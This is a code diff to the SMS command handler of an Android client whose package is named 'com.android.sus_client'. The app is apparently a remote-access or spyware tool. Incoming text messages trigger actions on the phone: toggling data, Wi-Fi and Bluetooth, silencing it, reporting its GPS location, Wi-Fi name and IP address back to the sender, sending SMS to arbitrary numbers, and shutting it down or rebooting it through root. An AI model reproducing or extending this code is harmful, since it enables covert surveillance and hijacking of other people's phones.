@@ -21,9 +21,12 @@ import android.telephony.SmsManager;
 import android.text.TextUtils;
 
 import java.io.DataOutputStream;
-import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 
 import com.android.sus_client.services.GpsTracker;
 import com.android.sus_client.utils.AppUtils;
@@ -45,92 +48,105 @@ public class SmsActionHandler {
     private long mLastEventTime;
     private static final long MIN_EVENT_INTERVAL = 1000;
 
-    public interface CMD {
-        String RING_SILENT = "RingSilent";
-        String RING_NORMAL = "RingNormal";
-        String DATA_ON = "DataOn";
-        String DATA_OFF = "DataOff";
-        String WIFI_ON = "WifiOn";
-        String WIFI_OFF = "WifiOff";
-        String BLUETOOTH_ON = "BluetoothOn";
-        String BLUETOOTH_OFF = "BluetoothOff";
-        String FLASH_ON = "FlashOn";
-        String FLASH_OFF = "FlashOff";
-        String NOTIFICATION = "Notification";
-        String WIFI_NAME = "WifiName";
-        String LOCATION = "GpsLocation";
-        String IP_ADDRESS = "IpAddress";
-        String SEND_SMS = "SendSMS";
-        String PLAY_RING = "PlayRing";
-        String SHUTDOWN_DEVICE = "ShutdownDe";
-        String RESTART_DEVICE = "RestartDe";
+    public enum CMD {
+        RING_SILENT("RingSilent"),
+        RING_NORMAL("RING_NORMAL"),
+        DATA_ON("DataOn"),
+        DATA_OFF("DataOff"),
+        WIFI_ON("WifiOn"),
+        WIFI_OFF("WifiOff"),
+        BLUETOOTH_ON("BluetoothOn"),
+        BLUETOOTH_OFF("BluetoothOff"),
+        FLASH_ON("FlashOn"),
+        FLASH_OFF("FlashOff"),
+        NOTIFICATION("Notification"),
+        WIFI_NAME("WifiName"),
+        LOCATION("GpsLocation"),
+        IP_ADDRESS("IpAddress"),
+        SEND_SMS("SendSMS"),
+        PLAY_RING("PlayRing"),
+        SHUTDOWN_DEVICE("ShutdownDe"),
+        RESTART_DEVICE("RestartDe");
+
+        private static final Map<String, CMD> BY_CMD = new HashMap<>();
+
+        static {
+            for (CMD e : values()) {
+                BY_CMD.put(e.cmd, e);
+            }
+        }
+
+        public final String cmd;
+
+        CMD(String cmd) {
+            this.cmd = cmd;
+        }
+
+        public static CMD valueOfCmd(String cmd) {
+            return BY_CMD.get(cmd.trim());
+        }
     }
 
 
-    public void attachOnReceive(Context context, String message, String senderNo) {
+    public SmsActionHandler(Context context, String message, String senderNo) {
         this.context = context;
         this.senderNo = senderNo;
         this.wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
         this.appUtils = new AppUtils(context);
-        if (!TextUtils.isEmpty(message)) {
-            try {
-                //String decodedMessage = convertHexToString(message);
-                processAction(message);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+        try {
+            processAction(getArgs(message));
+        } catch (Exception ignored) {
         }
     }
 
     @SuppressLint("NewApi")
-    private void processAction(String message) throws Exception {
-        final String mAction = message.split(TXT_SEPARATOR)[0];
-        switch (mAction) {
+    private void processAction(List<String> args) throws Exception {
+        switch (CMD.valueOfCmd(args.get(0))) {
             // SILENT MODE
-            case CMD.RING_SILENT:
+            case RING_SILENT:
                 AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                 am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                 break;
 
             // NORMAL MODE
-            case CMD.RING_NORMAL:
+            case RING_NORMAL:
                 AudioManager am1 = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                 am1.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                 break;
 
             // Data ON
-            case CMD.DATA_ON:
+            case DATA_ON:
                 setMobileDataState(context, true);
                 break;
 
             // Data OFF
-            case CMD.DATA_OFF:
+            case DATA_OFF:
                 setMobileDataState(context, false);
                 break;
 
             // WIFI ON
-            case CMD.WIFI_ON:
+            case WIFI_ON:
                 wifiManager.setWifiEnabled(true);
                 wifiManager.startScan();
                 break;
 
             // WIFI OFF
-            case CMD.WIFI_OFF:
+            case WIFI_OFF:
                 wifiManager.setWifiEnabled(false);
                 break;
 
             // BLUETOOTH ON
-            case CMD.BLUETOOTH_ON:
+            case BLUETOOTH_ON:
                 BluetoothAdapter.getDefaultAdapter().enable();
                 break;
 
             // BLUETOOTH OFF
-            case CMD.BLUETOOTH_OFF:
+            case BLUETOOTH_OFF:
                 BluetoothAdapter.getDefaultAdapter().disable();
                 break;
 
             // FLASHLIGHT ON BACK CAM
-            case CMD.FLASH_ON:
+            case FLASH_ON:
                 CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                 // 0 MEANS BACK CAM
                 // I PUT TRY AND CATCH ON THIS , BECAUSE SOME PHONE(S) DOESN'T HAVE ANY FLASHLIGHT AND AVOIDING THE APP CRASHES
@@ -141,7 +157,7 @@ public class SmsActionHandler {
                 break;
 
             // FLASHLIGHT OFF BACK CAM
-            case CMD.FLASH_OFF:
+            case FLASH_OFF:
                 CameraManager cameraManager1 = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                 // 0 MEANS BACK CAM
                 // I PUT TRY AND CATCH ON THIS , BECAUSE SOME PHONE(S) DOESN'T HAVE ANY FLASHLIGHT AND AVOIDING THE APP CRASHES
@@ -152,9 +168,9 @@ public class SmsActionHandler {
                 break;
 
             // Show a notification as APPLICATION NAME and APPLICATION ICON
-            case CMD.NOTIFICATION:
-                String Title = message.split(TXT_SEPARATOR)[1];
-                String Body = message.split(TXT_SEPARATOR)[2];
+            case NOTIFICATION:
+                String Title = args.get(1);
+                String Body = args.get(2);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     /*NotificationChannel channel = new NotificationChannel("n", "n", NotificationManager.IMPORTANCE_DEFAULT);
                     NotificationManager manager = context.getSystemService(NotificationManager.class);
@@ -171,7 +187,7 @@ public class SmsActionHandler {
                 break;
 
             // WIFI NAME
-            case CMD.WIFI_NAME:
+            case WIFI_NAME:
                 WifiInfo info = wifiManager.getConnectionInfo();
                 if (info != null) {
                     final String textMessageEncoded = convertStringToHex(info.getSSID());
@@ -180,7 +196,7 @@ public class SmsActionHandler {
                 break;
 
             // GPS Location
-            case CMD.LOCATION:
+            case LOCATION:
                 GpsTracker gpsTracker = GpsTracker.getInstance(context);
                 gpsTracker.setLocationListener(locationData -> {
                     if (gpsTracker.trackingEnabled()) {
@@ -197,7 +213,7 @@ public class SmsActionHandler {
                 break;
 
             // IP Address
-            case CMD.IP_ADDRESS:
+            case IP_ADDRESS:
                 String ip4 = DeviceInfo.getPublicIPAddress(false);
                 String ip6 = DeviceInfo.getPublicIPAddress(true);
                 String ips = "";
@@ -211,25 +227,25 @@ public class SmsActionHandler {
                 break;
 
             // SEND A MESSAGE (Eg; SendSMS@x@8080@x@Hello User!)
-            case CMD.SEND_SMS:
-                String mNumber = message.split(TXT_SEPARATOR)[1];
-                String mMessage = message.split(TXT_SEPARATOR)[2];
+            case SEND_SMS:
+                String mNumber = args.get(1);
+                String mMessage = args.get(2);
                 sendSMS(mNumber, mMessage);
                 break;
 
             //PLAY A SOUND BE CREATIVE
-            case CMD.PLAY_RING:
+            case PLAY_RING:
                 appUtils.playAssetSound("sound_horror.wav");
                 break;
 
             // SHUTDOWN DEVICE (ROOT ONLY COMMAND)
-            case CMD.SHUTDOWN_DEVICE:
+            case SHUTDOWN_DEVICE:
                 Process p0 = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
                 p0.waitFor();
                 break;
 
             // RESTART DEVICE (ROOT ONLY COMMAND)
-            case CMD.RESTART_DEVICE:
+            case RESTART_DEVICE:
                 Process p1 = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                 p1.waitFor();
                 break;
@@ -357,11 +373,37 @@ public class SmsActionHandler {
     public static String convertHexToString(String hex) {
         StringBuilder result = new StringBuilder();
         for (int i = 0; i < hex.length() - 1; i += 2) {
-            String tempInHex = hex.substring(i, (i + 2));
-            int decimal = Integer.parseInt(tempInHex, 16);
-            result.append((char) decimal);
+            try {
+                String tempInHex = hex.substring(i, (i + 2));
+                int decimal = Integer.parseInt(tempInHex, 16);
+                result.append((char) decimal);
+            } catch (RuntimeException ignored) {
+            }
         }
         return result.toString();
+    }
+
+    public static List<String> getArgs(String message) {
+        final String decodedMessage = message.trim();
+        //final String decodedMessage = convertHexToString(message.trim());
+        try {
+            return Arrays.asList(decodedMessage.split(TXT_SEPARATOR));
+        } catch (Exception ignored) {
+        }
+        return new ArrayList<>();
+    }
+
+    public static boolean hasCommand(String message) {
+        final List<String> args = getArgs(message);
+        if (args.isEmpty()) return false;
+
+        final String command = args.get(0);
+        for (CMD cmd : CMD.values()) {
+            if (command.contentEquals(cmd.cmd)) {
+                return true;
+            }
+        }
+        return false;
     }
 
 }
